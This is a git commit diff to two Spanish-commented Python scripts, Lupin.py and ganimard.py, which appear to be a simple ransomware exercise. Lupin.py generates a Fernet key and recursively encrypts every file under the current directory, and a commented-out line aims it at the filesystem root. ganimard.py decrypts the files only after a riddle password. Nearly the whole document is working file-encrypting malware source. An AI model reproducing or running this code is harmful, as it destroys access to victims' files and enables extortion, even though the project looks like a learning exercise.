e12e2d9b893b7e01a521ba814c7c57c9e6a244a0
barearojo <barearojojuan@gmail.com>
2023-11-14 19:54:59 +0100

    V2

--- Lupin.py
+++ Lupin.py
@@ -5,8 +5,13 @@ from cryptography.fernet import Fernet
 # Evitar que encripte también la llave con el objetivo de poder desencriptar luego los archivos
 
 print ("Todo sus archivos van a ser robados")
-Archivos_obj=[]
 
+#Generación de la llave con Fernet. Evita que se pueda abrir un archivo al menos que se tenga la llave
+llave = Fernet.generate_key()
+with open("laLLave.key","wb") as laLLave:
+    laLLave.write(llave)
+
+#encriptar archivos
 def encriptar_archivo(nombre_archivo,llave):
     with open(nombre_archivo,"rb") as archivo:
         contenido = archivo.read()
@@ -14,29 +19,20 @@ def encriptar_archivo(nombre_archivo,llave):
     with open(nombre_archivo,"wb") as archivo_encrypt:
         archivo_encrypt.write(encriptado)
 
+#encripatr directorio
+def encriptar_directorio(ruta_directorio,llave):
+    for raiz, directorios, archivos in os.walk(ruta_directorio): # trabaja de forma recusiva
+        for nombre_archivo in archivos:
+            if nombre_archivo in ["Lupin.py","ganimard.py","laLLave.key"]:
+                continue
+            else:
+                ruta_completa = os.path.join(raiz,nombre_archivo)
+                encriptar_archivo(ruta_completa,llave)
 
-for archivo in os.listdir():
-    if archivo =="Lupin.py" or archivo=="laLLave.key" or archivo=="ganimard.py":
-        continue
+#directorio actual y lo que hay debajo
+encriptar_directorio('.',llave)
+#Enciptar Todo
+#encriptar_directorio('../../../../../../../../../../../../',llave)
     
-    #en caso de que no queramos encriptar directorios también
-    #if os.path.isdir(file):
-        #continue
-    if os.path.isfile(archivo):
-        Archivos_obj.append(archivo)
-    
-#Generación de la llave con Fernet. Evita que se pueda abrir un archivo al menos que se tenga la llave
-llave = Fernet.generate_key()
-with open("laLLave.key","wb") as laLLave:
-    laLLave.write(llave)
-    
-#Encriptamos todos los archivos en nuestra lista de objetivo
-for archivo in Archivos_obj:
-    with open(archivo,"rb") as ArchivoEncrypt:
-        contents = ArchivoEncrypt.read() # pillamos ruta el archivo
-    encryptado = Fernet(llave).encrypt(contents) # encriptamos el archivo
-    
-    with open(archivo,"wb") as ArchivoEncrypt: #  mdoificamos el archivo original
-        ArchivoEncrypt.write(encryptado)
         
 print ("Todo sus archivos han sido robados")
--- ganimard.py
+++ ganimard.py
@@ -1,21 +1,25 @@
 import os
 from cryptography.fernet import Fernet
 
-#Primero buscamos todos los archivos del dorectorio menos el propio Lupin
-# Evitar que encripte también la llave con el objetivo de poder desencriptar luego los archivos
 
-Archivos_obj=[]
+#encriptar archivos
+def deeencriptar_archivo(nombre_archivo,llave):
+    with open(nombre_archivo,"rb") as archivo:
+        contenido = archivo.read()
+    encriptado = Fernet(llave).decrypt(contenido)
+    with open(nombre_archivo,"wb") as archivo_encrypt:
+        archivo_encrypt.write(encriptado)
 
-for archivo in os.listdir():
-    if archivo =="Lupin.py" or archivo=="laLLave.key" or archivo=="ganimard.py":
-        continue
-    
-    #en caso de que no queramos encriptar directorios también
-    #if os.path.isdir(file):
-        #continue
-    if os.path.isfile(archivo):
-        Archivos_obj.append(archivo)
-    
+#encripatr directorio
+def deencriptar_directorio(ruta_directorio,llave):
+    for raiz, directorios, archivos in os.walk(ruta_directorio): # trabaja de forma recusiva
+        for nombre_archivo in archivos:
+            if nombre_archivo in ["Lupin.py","ganimard.py","laLLave.key"]:
+                continue
+            else:
+                ruta_completa = os.path.join(raiz,nombre_archivo)
+                deeencriptar_archivo(ruta_completa,llaveSecreta)
+
 with open("laLLave.key","rb") as llave:
     llaveSecreta = llave.read()
 
@@ -25,13 +29,7 @@ user_password=input("Cual fue mi primera aventura?\n")
 
 if user_password == password:
     #DesEncriptamos todos los archivos en nuestra lista de objetivo
-    for archivo in Archivos_obj:
-        with open(archivo,"rb") as ArchivoEncrypt:
-            contents = ArchivoEncrypt.read() # pillamos ruta el archivo
-        no_encryptado = Fernet(llaveSecreta).decrypt(contents) # desencriptamos el archivo
-        with open(archivo,"wb") as ArchivoEncrypt: #  mddificamos el archivo original
-            ArchivoEncrypt.write(no_encryptado)  
-              
+    deencriptar_directorio('.',llaveSecreta)
     print("Volveremos a vernos detective")
     
 else:
